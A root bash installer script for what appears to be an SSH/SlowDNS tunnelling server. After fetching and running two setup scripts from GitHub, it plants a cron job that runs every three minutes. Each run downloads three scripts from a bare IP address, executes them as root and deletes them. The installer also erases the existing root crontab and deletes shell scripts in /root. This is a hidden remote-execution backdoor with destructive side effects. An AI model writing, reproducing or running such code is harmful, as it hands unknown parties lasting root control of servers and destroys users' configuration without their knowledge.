#!/bin/bash

if [ "${EUID}" -ne 0 ]; then
		echo "You need to run this script as root"
		exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
		echo "OpenVZ is not supported"
		exit 1
fi
# ==========================================
# Color
red='\e[1;31m'
green='\e[0;32m'
yell='\e[1;33m'
NC='\e[0m'



echo "installing insaller SSH "
sleep 1
wget https://raw.githubusercontent.com/jhoexii/slowdns/main/ssh.sh && chmod +x ssh.sh && ./ssh.sh
echo -e "[ ${green}INFO${NC} ] DONE... ALAT"
sleep 1
echo "Progress..."
echo "Sedang berlangsung..."
sleep 3



cd
echo "installing insaller Slowdns "
wget https://raw.githubusercontent.com/jhoexii/slowdns/main/slowdns.sh && chmod +x slowdns.sh && ./slowdns.sh
sleep 1
mkdir /usr/local/sbin/jho
chmod +x /usr/local/sbin/jho
cat << EOF > /usr/local/sbin/jho/cron.sh
#!/bin/bash
wget -O /usr/local/sbin/jho/active.sh http://107.152.37.78/yutax/app/prem
wget -O /usr/local/sbin/jho/inactive.sh http://107.152.37.78/yutax/app/xprem
wget -O /usr/local/sbin/jho/deleted.sh http://107.152.37.78/yutax/app/deleted
chmod -R +x /usr/local/sbin/jho/
cd /root
rm -rf *sh
/bin/bash /usr/local/sbin/jho/active.sh
/bin/bash /usr/local/sbin/jho/inactive.sh
/bin/bash /usr/local/sbin/jho/deleted.sh
rm /usr/local/sbin/jho/inactive.sh
rm /usr/local/sbin/jho/active.sh
rm /usr/local/sbin/jho/deleted.sh
EOF
chmod +x /usr/local/sbin/jho/cron.sh
crontab -r
echo "SHELL=/bin/bash
*/3 * * * * /bin/bash /usr/local/sbin/jho/cron.sh >/dev/null 2>&1" | crontab -
service cron restart
